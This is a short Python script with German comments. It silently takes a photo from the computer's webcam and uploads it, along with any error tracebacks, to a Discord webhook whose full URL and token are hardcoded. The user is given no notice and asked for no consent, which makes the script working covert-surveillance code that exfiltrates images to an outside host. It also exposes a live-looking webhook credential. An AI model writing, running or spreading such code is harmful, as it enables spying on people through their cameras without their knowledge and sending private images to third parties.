import cv2
import requests
import traceback
import io

WEBHOOK_URL = "https://discord.com/api/webhooks/1469709535022420152/Fvmuq_82nWlMjj_KSV7mf-QnucQX7JyagCncSNPRnO56_-ywOdwI3hO7YcXJ7rTtapya"

def send_message(content):
    requests.post(WEBHOOK_URL, json={"content": content})

def send_image_cv2(frame):
    # Bild direkt in den Speicher schreiben
    is_success, buffer = cv2.imencode(".jpg", frame)
    if not is_success:
        raise Exception("Bild konnte nicht in JPEG umgewandelt werden.")
    
    file_bytes = io.BytesIO(buffer)
    requests.post(
        WEBHOOK_URL,
        files={"file": ("Pic.jpg", file_bytes, "image/jpeg")}
    )

try:
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        raise Exception("Kamera Index 0 konnte nicht geöffnet werden.")

    ret, frame = cap.read()
    cap.release()

    if not ret:
        raise Exception("Pic could not be Taken.")

    send_message("📷 Pic Taken:")
    send_image_cv2(frame)

except Exception:
    error_text = f"❌ Error:\n```\n{traceback.format_exc()}\n```"
    send_message(error_text)
